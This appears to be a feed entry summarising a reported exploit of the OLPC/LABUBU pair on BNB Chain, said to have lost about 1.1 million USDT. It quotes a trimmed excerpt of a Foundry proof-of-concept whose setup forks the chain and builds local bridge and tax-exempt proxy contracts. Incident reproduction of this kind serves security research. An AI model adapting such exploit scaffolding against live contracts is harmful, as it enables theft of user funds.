# [?] OLPC - OLPC pair reserve manipulation

## Summary
Severity: Unknown
Chain: BNB Chain
Component: OLPC
Published: 2026-06-20
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/OLPC_exp.sol
Type: defi-exploit-poc

## Details
Lost: 1,115,903.66 USDT

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    BridgeSwapRouter private bridgeRouter;
    TaxExemptBridgeProxy private bridgeProxy;

    function setUp() public {
        uint256 forkBlock = 105_326_392;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = USDT_TOKEN;
        attacker = address(this);

        vm.label(OLPC, "OLPC");
        vm.label(LABUBU, "LABUBU");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(PANCAKE_ROUTER, "PancakeSwap V2 Router");
        vm.label(OLPC_LABUBU_PAIR, "OLPC/LABUBU Pair");

        bridgeProxy = new TaxExemptBridgeProxy();
        bridgeRouter = new BridgeSwapRouter(address(bridgeProxy));
        PassThroughBridgeHook olpcHook = new PassThroughBridgeHook(OLPC);
        LabubuFeeHook labubuFeeHook = new LabubuFeeHook();

        bridgeRouter.setHook(OLPC, address(olpcHook));
        bridgeRouter.setHook(LABUBU, address(labubuFeeHook));
        bridgeProxy.approveToken(LABUBU, address(bridgeRouter));
        bridgeProxy.approveToken(LABUBU, PANCAKE_ROUTER);

        vm.label(address(bridgeRouter), "Local bridge router");
        vm.label(address(bridgeProxy), "Local tax-exempt bridge proxy");
        vm.label(address(olpcHook), "Local OLPC bridge hook");
        vm.label(address(labubuFeeHook), "Local LABUBU fee hook");

        // Historical helper 0x0e3c... was LABUBU tax-exempt. Patch the same token-side state for the local proxy.
        bytes32 taxExemptSlot = keccak256(abi.encode(address(bridgeProxy), uint256(42)));
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/OLPC_exp.sol_
